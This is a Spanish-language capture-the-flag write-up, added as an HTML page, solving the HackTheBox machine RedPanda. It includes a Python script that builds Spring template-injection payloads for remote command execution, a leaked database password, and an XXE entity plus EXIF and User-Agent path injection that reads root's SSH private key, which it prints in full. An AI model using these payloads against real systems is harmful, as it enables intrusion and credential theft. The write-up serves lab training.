@@ -1,0 +1,292 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup RedPanda HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/redpanda.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup RedPanda HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina RedPanda de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina RedPanda de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup RedPanda HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup RedPanda HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina RedPanda de la plataforma de HackTheBox","headline":"Writeup RedPanda HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup RedPanda HackTheBox</h1>
+          <p>Resolución de la máquina RedPanda de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.170
+Nmap scan report for 10.10.11.170
+PORT      STATE SERVICE
+22/tcp    open  ssh
+8080/tcp  open  http-proxy</span>
+</code></pre></div></div>
+
+<div><p>En el puerto 8080 nos encontramos un buscador de pandas rojos</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Al mirar las tecnologias con whatweb, en el titulo vemos que emplea Spring Boot</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ whatweb</span><span class="p"> http://10.10.11.170:8080
+Title[Red Panda Search | </span><span class="kd">Made with Spring Boot</span><span class="p">]</span>
+</code></pre></div></div>
+
+<div><p>Sabiendo esto podemos usar un ejemplo de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a>, pero nos bloquea el $</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Sin embargo podemos usar * que funciona de la misma manera</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Para no hacer el proceso a mano podemos crear un script que lo automatize</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">import </span><span class="p">requests
+</span><span class="kd">from</span><span class="p"> cmd</span><span class="kd"> import </span><span class="p">Cmd
+</span><span class="kd">from</span><span class="p"> bs4</span><span class="kd"> import </span><span class="p">BeautifulSoup
+
+</span><span class="k">class</span><span class="na"> RCE</span><span class="p">(</span><span class="kd">Cmd</span><span class="p">):
+    prompt </span><span class="kd">=</span><span class="s2"> "\033[1;31m$\033[1;37m "
+    </span><span class="k">def </span><span class="na">decimal</span><span class="p">(</span><span class="no">self</span><span class="p">, </span><span class="no">args</span><span class="p">):
+        </span><span class="p">comando </span><span class="kd">=</span><span class="p"> args
+        </span><span class="p">decimales </span><span class="kd">=</span><span class="p"> []
+
+        </span><span class="kd">for</span><span class="p"> i </span><span class="kd">in</span><span class="p"> comando:
+            decimales.append(</span><span class="k">str</span><span class="p">(</span><span class="k">ord</span><span class="p">(</span><span class="no">i</span><span class="p">)))
+        payload </span><span class="kd">=</span><span class="s2"> "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)"</span><span class="kd"> % </span><span class="p">decimales[</span><span class="na">0</span><span class="p">]
+
+        </span><span class="kd">for</span><span class="p"> i </span><span class="kd">in</span><span class="p"> decimales[</span><span class="na">1</span><span class="p">:</span><span class="p">]:
+            payload </span><span class="kd">+=</span><span class="s2"> ".concat(T(java.lang.Character).toString({}))"</span><span class="p">.format(</span><span class="no">i</span><span class="p">)
+
+        payload </span><span class="kd">+=</span><span class="s2"> ").getInputStream())}"</span><span class="p">
+        data </span><span class="kd">=</span><span class="p"> { </span><span class="s2">"name"</span><span class="p">: payload }
+        requer </span><span class="kd">=</span><span class="p"> requests.post(</span><span class="s2">"http://10.10.11.170:8080/search"</span><span class="p">, </span><span class="no">data</span><span class="kd">=</span><span class="p">data)
+        parser </span><span class="kd">=</span><span class="p"> BeautifulSoup(requer.content, </span><span class="s2">'html.parser'</span><span class="p">)
+        grepcm </span><span class="kd">=</span><span class="p"> parser.find_all(</span><span class="s2">"h2"</span><span class="p">)[</span><span class="na">0</span><span class="p">].get_text()
+        result </span><span class="kd">=</span><span class="p"> grepcm.replace(</span><span class="s2">'You searched for:'</span><span class="p">,</span><span class="s2">''</span><span class="p">).strip()
+        </span><span class="k">print</span><span class="p">(result)
+
+    </span><span class="k">def </span><span class="na">default</span><span class="p">(</span><span class="no">self</span><span class="p">,</span><span class="no"> args</span><span class="p">):
+        </span><span class="k">try</span><span class="p">:
+            self.decimal(args)
+        </span><span class="k">except</span><span class="p">:
+            </span><span class="k">print</span><span class="p">(</span><span class="s2">"%s: command not found"</span><span class="kd"> % </span><span class="p">(args))
+
+RCE().cmdloop()</span>
+</code></pre></div></div>
+
+<div><p>Basta con ejecutarlo con python3 para poder ejecutar comandos y leer la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> exploit.py
+</span><span class="kd">$</span><span class="p"> id
+uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
+</span><span class="kd">$</span><span class="p"> hostname -I
+10.10.11.170 dead:beef::250:56ff:feb9:6df0
+</span><span class="kd">$</span><span class="p"> cat /home/woodenk/user.txt
+7b8**************************11d
+</span><span class="kd">$</span>
+</code></pre></div></div>
+
+<div><p>Despues de buscar un rato entre directorios encontramos credenciales en MainController.java</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$</span><span class="p"> cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
+&lt......................................................................................................>
+conn </span><span class="kd">=</span><span class="p"> DriverManager.getConnection(</span><span class="s2">"jdbc:mysql://localhost:3306/red_panda"</span><span class="p">,</span><span class="s2"> "</span><span class="kd">woodenk</span><span class="p"></span><span class="s2">"</span><span class="p">,</span><span class="s2"> "</span><span class="kd">RedPandazRule</span><span class="p"></span><span class="s2">"</span><span class="p">);
+stmt </span><span class="kd">=</span><span class="p"> conn.prepareStatement(</span><span class="s2">"SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?"</span><span class="p">);
+stmt.setString(</span><span class="na">1</span><span class="p">, </span><span class="s2">"%"</span><span class="p"> + query + </span><span class="s2">"%"</span><span class="p">);
+&lt...................................></span>
+</code></pre></div></div>
+
+<div><p>Podemos usarlas para conectarnos por ssh, ahora estamos en una shell real</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> woodenk@10.10.11.170
+</span><span class="p">woodenk@10.10.11.170's password: </span><span class="kd">RedPandazRule
+</span><span class="s2">woodenk@redpanda</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+7b8**************************11d
+</span><span class="s2">woodenk@redpanda</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si miramos con <a href="https://github.com/DominicBreuker/pspy">pspy</a> tareas del sistema, vemos que root corre un script como woodenk</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">CMD: UID=0    PID=8420   | /bin/sh -c sudo -u woodenk /opt/cleanup.sh
+</span><span class="k">CMD: UID=1000 PID=8422   | /bin/bash /opt/cleanup.sh 
+CMD: UID=1000 PID=8423   | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ; 
+CMD: UID=1000 PID=8424   | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ; 
+CMD: UID=1000 PID=8425   | /usr/bin/find /dev/shm -name *.xml -exec rm -rf {} ; 
+CMD: UID=1000 PID=8426   | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ;
+CMD: UID=1000 PID=8429   | /usr/bin/find /tmp -name *.jpg -exec rm -rf {} ; 
+CMD: UID=1000 PID=8430   | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ; 
+CMD: UID=1000 PID=8432   | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;</span>
+</code></pre></div></div>
+
+<div><p>Esto puede ser una pista para escalar, ya que ¿porque borra archivos con esa extensión?</p></div>
+<div><p>Revisando de nuevo el archivo donde encontramos credenciales vemos como exporta el xml</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">@GetMapping(</span><span class="no">value</span><span class="kd">=</span><span class="s2">"/export.xml"</span><span class="p">,</span><span class="no"> produces</span><span class="kd"> = </span><span class="k">MediaType.</span><span class="na">APPLICATION_OCTET_STREAM_VALUE</span><span class="p">)
+  </span><span class="kd">public</span><span class="p"> @ResponseBody </span><span class="na">byte</span><span class="kd">[]</span><span class="p"> exportXML(@RequestParam(</span><span class="no">name</span><span class="kd">=</span><span class="s2">"author"</span><span class="p">, </span><span class="no">defaultValue</span><span class="kd">=</span><span class="s2">"err"</span><span class="p">) </span><span class="k">String</span><span class="p"> author) throws </span><span class="k">IOException</span><span class="p"> {
+
+      </span><span class="k">System</span><span class="p">.out.println(</span><span class="s2">"Exporting xml of: "</span><span class="kd"> +</span><span class="p"> author);
+      </span><span class="kd">if</span><span class="p">(author.equals(</span><span class="s2">"woodenk"</span><span class="p">) </span><span class="kd">||</span><span class="p"> author.equals(</span><span class="s2">"damian"</span><span class="p">))
+      {
+          </span><span class="k">InputStream</span><span class="p"> in </span><span class="kd">= new </span><span class="k">FileInputStream</span><span class="p">(</span><span class="s2">"/credits/"</span><span class="kd"> + </span><span class="p">author</span><span class="kd"> +</span><span class="s2"> "_creds.xml"</span><span class="p">);
+          </span><span class="k">System</span><span class="p">.out.println(in);
+          </span><span class="kd">return</span><span class="k"> IOUtils</span><span class="p">.toByteArray(in);
+      }
+      </span><span class="kd">else</span><span class="p">
+      {
+          </span><span class="kd">return</span><span class="k"> IOUtils</span><span class="p">.toByteArray(</span><span class="s2">"Error, incorrect paramenter 'author'\n\r"</span><span class="p">);
+      }
+  }</span>
+</code></pre></div></div>
+
+<div><p>Además en otro archivo App.java podemos ver como maneja la metadata</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">public static</span><span class="k"> String</span><span class="p"> getArtist(</span><span class="k">String</span><span class="p"> uri) throws </span><span class="k">IOException</span><span class="p">, </span><span class="k">JpegProcessingException</span><span class="p">
+{
+    </span><span class="k">String</span><span class="p"> fullpath </span><span class="kd">=</span><span class="s2"> "/opt/panda_search/src/main/resources/static"</span><span class="kd"> +</span><span class="p"> uri;
+    </span><span class="k">File</span><span class="p"> jpgFile </span><span class="kd">= new</span><span class="k"> File</span><span class="p">(fullpath);
+    </span><span class="k">Metadata</span><span class="p"> metadata </span><span class="kd">=</span><span class="k"> JpegMetadataReader</span><span class="p">.readMetadata(jpgFile);
+    </span><span class="kd">for</span><span class="p">(</span><span class="k">Directory</span><span class="p"> dir </span><span class="kd">:</span><span class="p"> metadata.getDirectories())
+    {
+        </span><span class="kd">for</span><span class="p">(</span><span class="k">Tag</span><span class="p"> tag </span><span class="kd">: </span><span class="p">dir.getTags())
+        {
+            </span><span class="kd">if</span><span class="p">(tag.getTagName() </span><span class="kd">==</span><span class="s2"> "Artist"</span><span class="p">)
+            {
+                </span><span class="kd">return</span><span class="p"> tag.getDescription();
+            }
+        }
+    }
+
+    </span><span class="kd">return </span><span class="s2">"N/A"</span><span class="p">;
+}</span>
+</code></pre></div></div>
+
+<div><p>Ahora empieza a tener sentido que borrara archivos con esas extensiones</div></p>
+<div><p>Pero además en el archivo nos muestra como maneja el User-Agent</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">public static</span><span class="k"> Map</span><span class="p"> parseLog(</span><span class="k">String</span><span class="p"> line) {
+    </span><span class="k">String</span><span class="kd">[]</span><span class="p"> strings </span><span class="kd">=</span><span class="p"> line.split(</span>
+    </span><span class="k">Map map </span><span class="kd">= new</span><span class="k"> HashMap</span><span class="p"><>();
+    map.put(</span><span class="s2">"status_code"</span><span class="p">, </span><span class="k">Integer</span><span class="p">.parseInt(strings[</span><span>
+    map.put(</span><span class="s2">"ip"</span><span class="p">, strings[</span><span class="na">1</span><span class="p">]);
+    map.put(</span><span class="s2">"user_agent"</span><span class="p">, strings[</span><span class="na">2</span><span class="p">]);
+    map.put(</span><span class="s2">"uri"</span><span class="p">, strings[</span><span class="na">3</span><span class="p">]);
+    </span><span class="kd">return</span><span class="p"> map;
+}</span>
+</code></pre></div></div>
+
+<div><p>Mirando esta configuración podemos inyectar en el campo "Artist", una ruta donde estará el xml, esto en una imagen cualquiera que despues subiremos a la máquina</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wget</span><span class="no"> "https://avatars.githubusercontent.com/u/95899548?v=4"</span><span class="p">
+Longitud: 33411 (33K) [image/jpeg]
+Grabando a: «95899548?v=4»
+
+95899548?v=4               100%[====================================>]       
+
+«95899548?v=4» guardado [33411/33411]
+
+</span><span class="s2">❯ mv</span><span class="p"> 95899548\?v=4 gato.jpg
+</span><span class="s2">❯ exiftool</span><span class="p"> -Artist=</span><span class="no">"../home/woodenk/privesc"</span><span class="p"> gato.jpg
+    1 image files updated
+</span><span class="s2">❯ scp</span><span class="p"> gato.jpg woodenk@10.10.11.170:.
+woodenk@10.10.11.170's password: </span><span class="kd">RedPandazRule</span><span class="p">
+gato.jpg                                                 100%</span>
+</code></pre></div></div>
+
+<div><p>A continuación crearemos en el home un archivo xml que apunte a la id_rsa de root, esto con el nombre definido en la imagen más _creds.xml que es lo suma el archivo que encontramos</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">woodenk@redpanda</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat privesc_creds.xml
+</span><span class="c1">&lt!--?xml version="1.0" ?--></span><span class="p">
+&lt!</span><span class="k">DOCTYPE</span><span class="p"> replace [&lt!</span><span class="k">ENTITY</span><span class="p"> key </span><span class="k">SYSTEM</span><span class="s2"> "file:///root/.ssh/id_rsa"</span><span class="p">> ]>
+&lt</span><span class="k">credits</span><span class="p">>
+  &lt</span><span class="k">author</span><span class="p">>damian&lt/</span><span class="k">author</span><span class="p">>
+  &lt</span><span class="k">image</span><span class="p">>
+    &lt</span><span class="k">uri</span><span class="p">>/../../../../../../../home/woodenk/gato.jpg&lt/</span><span class="k">uri</span><span class="p">>
+    &lt</span><span class="k">privesc</span><span class="p">></span><span class="na">&key;</span><span class="p">&lt/</span><span class="k">privesc</span><span class="p">>
+    &lt</span><span class="k">views</span><span class="p">>0&lt/</span><span class="k">views</span><span class="p">>
+  &lt/</span><span class="k">image</span><span class="p">>
+  &lt</span><span class="k">totalviews</span><span class="p">>0&lt/</span><span class="k">totalviews</span><span class="p">>
+&lt/</span><span class="k">credits</span><span class="p">></span>
+</code></pre></div></div>
+
+<div><p>Ahora nos queda hacer una petición curl con el formato que vimos en el archivo como User-Agent</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> http://10.10.11.170:8080 -H </span><span class="no">"User-Agent: ||/../../../../../../../home/woodenk/gato.jpg"</span><span class="p"></span>
+</code></pre></div></div>
+
+<div><p>Finalmente exportar el xml desde /stats para que tome nuestro archivo</div></p>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Después de unos segundos si revisamos el xml tendra la id_rsa de root</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">woodenk@redpanda</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat privesc_creds.xml
+&lt?xml version="1.0" encoding="UTF-8"?>
+&lt!--?xml version="1.0" ?-->
+&lt!DOCTYPE replace>
+&ltcredits>
+  &ltauthor>damian&lt/author>
+  &ltimage>
+    &lturi>/../../../../../../../home/woodenk/gato.jpg&lt/uri>
+    &ltprivesc>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
+ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
+AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
+RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
+-----END OPENSSH PRIVATE KEY-----
+&lt/privesc>
+    &ltviews>3&lt/views>
+  &lt/image>
+  &lttotalviews>3&lt/totalviews>
+&lt/credits>
+</span><span class="s2">woodenk@redpanda</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Con esta pequeña id_rsa podemos finalmente conectarnos por ssh y visualizar la flag</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> root@10.10.11.170 -i id_rsa
+</span><span class="s2">root@redpanda</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@redpanda</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.10.11.170 dead:beef::250:56ff:feb9:6df0 
+</span><span class="s2">root@redpanda</span><span class="p">:</span><span class="na">~</span><span class="p"># cat root.txt 
+b93*************************5de
+</span><span class="s2">root@redpanda</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </sction>
+
+    </div>
+  </body>
+</html>
